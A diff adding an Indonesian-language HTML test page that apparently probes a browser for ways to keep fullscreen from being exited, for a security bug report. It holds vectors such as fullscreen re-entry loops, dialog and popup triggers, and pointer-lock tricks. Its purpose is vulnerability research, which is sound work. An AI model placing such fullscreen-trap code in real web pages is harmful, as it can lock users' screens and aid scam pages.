@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<title>FS-LOCK: Fullscreen stuck vectors</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { font-family: Segoe UI, sans-serif; background: #1a1a2e; color: #eee; min-height: 100vh; }
+  .wrap { max-width: 900px; margin: 0 auto; padding: 20px; }
+  h1 { color: #e94560; margin-bottom: 8px; }
+  .warn { background: #e94560; color: #fff; padding: 10px; border-radius: 6px; margin: 12px 0; font-weight: bold; }
+  .note { background: #16213e; padding: 10px; border-radius: 6px; margin: 8px 0; border-left: 3px solid #e94560; }
+  .sec { background: #16213e; padding: 12px; border-radius: 6px; margin: 10px 0; }
+  button { background: #e94560; color: #fff; border: none; padding: 8px 14px; border-radius: 4px; cursor: pointer; margin: 3px; font-size: 13px; }
+  button:hover { background: #c73652; }
+  .hit { color: #0f0; font-weight: bold; }
+  .miss { color: #f66; font-weight: bold; }
+  pre { background: #0f0f23; padding: 10px; border-radius: 4px; font-size: 12px; max-height: 300px; overflow: auto; }
+  #target { width: 800px; height: 400px; background: linear-gradient(135deg, #0f3460, #533483); display: flex; align-items: center; justify-content: center; color: #fff; font-size: 24px; border-radius: 8px; }
+</style>
+</head>
+<body>
+<div class="wrap">
+  <h1>FS-LOCK: Fullscreen Stuck Vectors</h1>
+  <div class="warn">TEST: Apakah ada vektor yang bikin fullscreen GAK BISA di-exit (Esc gagal)?</div>
+  <div class="note">Kalau Esc gak exit fullscreen setelah trigger vektor = <b>HIT (fullscreen lock, valid MSRC)</b>.<br>
+  Bukan spoofing — ini UI lock/DoS.</div>
+
+  <div class="sec">
+    <div id="target">Target fullscreen</div>
+  </div>
+
+  <div class="sec">
+    <h3>Control</h3>
+    <button onclick="enterFS()">Enter FS</button>
+    <button onclick="exitFS()">Exit FS</button>
+    <span id="fsState" class="miss">FS: false</span>
+    <span id="loopState"></span>
+  </div>
+
+  <div class="sec">
+    <h3>Vektor FS-LOCK</h3>
+    <button onclick="fsReenterLoop()">A. Re-enter loop (fullscreenchange → requestFullscreen)</button>
+    <button onclick="fsReenterInterval()">B. Re-enter interval 100ms</button>
+    <button onclick="fsAlert()">C. alert() saat FS aktif</button>
+    <button onclick="fsConfirm()">D. confirm() saat FS aktif</button>
+    <button onclick="fsPrompt()">E. prompt() saat FS aktif</button>
+    <button onclick="fsShareEsc()">F. navigator.share() + Esc</button>
+    <button onclick="fsOpenDialog()">G. showOpenFilePicker() saat FS</button>
+    <button onclick="fsPrint()">H. window.print() saat FS</button>
+    <button onclick="fsWindowOpen()">I. window.open() saat FS</button>
+    <button onclick="fsBeforeUnload()">J. beforeunload + navigate</button>
+    <button onclick="fsPointerLock()">K. requestPointerLock() + FS</button>
+    <button onclick="fsAll()">L. SEMUA vektor berurutan</button>
+    <button onclick="stopAll()">STOP semua loop</button>
+  </div>
+
+  <div class="sec">
+    <h3>Test manual</h3>
+    <div class="note">1. Enter FS → 2. Trigger vektor → 3. Tekan ESC<br>
+    4. Kalau FS tetap aktif setelah ESC = HIT<br>
+    5. Catat vektor mana yang bikin stuck</div>
+  </div>
+
+  <div class="sec">
+    <h3>Log</h3>
+    <pre id="log"></pre>
+  </div>
+</div>
+
+<script>
+const logEl = document.getElementById('log');
+let loops = [];
+function log(msg) {
+  const t = new Date().toLocaleTimeString();
+  logEl.textContent += `[${t}] ${msg}\n`;
+  logEl.scrollTop = logEl.scrollHeight;
+}
+function enterFS() {
+  document.getElementById('target').requestFullscreen({ navigationUI: 'hide' }).then(() => {
+    log('FS ENTERED'); checkFS();
+  }).catch(e => log('FS FAILED: ' + e.message));
+}
+function exitFS() {
+  if (document.fullscreenElement) {
+    document.exitFullscreen().then(() => { log('FS EXITED'); checkFS(); }).catch(e => log('Exit FAILED: ' + e.message));
+  } else log('No FS element');
+}
+function checkFS() {
+  const fs = !!document.fullscreenElement;
+  document.getElementById('fsState').textContent = 'FS: ' + fs;
+  document.getElementById('fsState').className = fs ? 'hit' : 'miss';
+}
+function stopAll() {
+  loops.forEach(l => { clearInterval(l); clearTimeout(l); });
+  loops = [];
+  log('ALL LOOPS STOPPED');
+}
+
+function fsReenterLoop() {
+  log('A: re-enter loop via fullscreenchange');
+  const handler = () => {
+    if (!document.fullscreenElement) {
+      log('A: FS exited, re-entering...');
+      document.getElementById('target').requestFullscreen({ navigationUI: 'hide' }).catch(e => log('A: re-enter failed: ' + e.message));
+    }
+  };
+  document.addEventListener('fullscreenchange', handler);
+  loops.push(setTimeout(() => document.removeEventListener('fullscreenchange', handler), 30000));
+  enterFS();
+}
+
+function fsReenterInterval() {
+  log('B: re-enter interval 100ms');
+  const id = setInterval(() => {
+    if (!document.fullscreenElement) {
+      document.getElementById('target').requestFullscreen({ navigationUI: 'hide' }).catch(() => {});
+    }
+  }, 100);
+  loops.push(id);
+  enterFS();
+}
+
+function fsAlert() { log('C: alert()'); alert('FS-LOCK alert test — tutup dialog lalu tekan Esc'); checkFS(); }
+function fsConfirm() { log('D: confirm()'); confirm('FS-LOCK confirm test'); checkFS(); }
+function fsPrompt() { log('E: prompt()'); prompt('FS-LOCK prompt test'); checkFS(); }
+
+async function fsShareEsc() {
+  log('F: navigator.share()');
+  try {
+    await navigator.share({ text: 'fs-lock share test' });
+    log('F: share resolved'); checkFS();
+  } catch(e) { log('F: share error: ' + e.name); checkFS(); }
+}
+
+async function fsOpenDialog() {
+  log('G: showOpenFilePicker()');
+  try {
+    await window.showOpenFilePicker();
+    log('G: picker resolved'); checkFS();
+  } catch(e) { log('G: picker error: ' + e.name); checkFS(); }
+}
+
+function fsPrint() { log('H: window.print()'); window.print(); checkFS(); }
+
+function fsWindowOpen() {
+  log('I: window.open()');
+  const w = window.open('about:blank', 'fslock', 'width=400,height=300');
+  if (w) { log('I: window opened'); w.document.write('<h1>FS-LOCK popup</h1><p>Tutup window ini lalu cek FS state</p>'); }
+  else log('I: popup blocked');
+  checkFS();
+}
+
+function fsBeforeUnload() {
+  log('J: beforeunload + navigate');
+  window.addEventListener('beforeunload', e => { e.preventDefault(); e.returnValue = ''; });
+  setTimeout(() => { log('J: navigating ke example.com...'); location.href = 'https://example.com'; }, 2000);
+}
+
+function fsPointerLock() {
+  log('K: requestPointerLock()');
+  try {
+    document.getElementById('target').requestPointerLock();
+    log('K: pointer lock requested'); checkFS();
+  } catch(e) { log('K: pointer lock error: ' + e.message); checkFS(); }
+}
+
+function fsAll() {
+  log('L: SEMUA vektor berurutan (A-F)');
+  fsReenterLoop();
+  setTimeout(fsAlert, 3000);
+  setTimeout(fsConfirm, 6000);
+  setTimeout(fsPrompt, 9000);
+  setTimeout(fsShareEsc, 12000);
+  setTimeout(fsOpenDialog, 15000);
+}
+
+document.addEventListener('fullscreenchange', () => { log('EVENT: fullscreenchange → ' + !!document.fullscreenElement); checkFS(); });
+
+log('Ready. navigator.share: ' + (typeof navigator.share === 'function') + ', showOpenFilePicker: ' + (typeof window.showOpenFilePicker === 'function'));
+checkFS();
+</script>
+</body>
+</html>
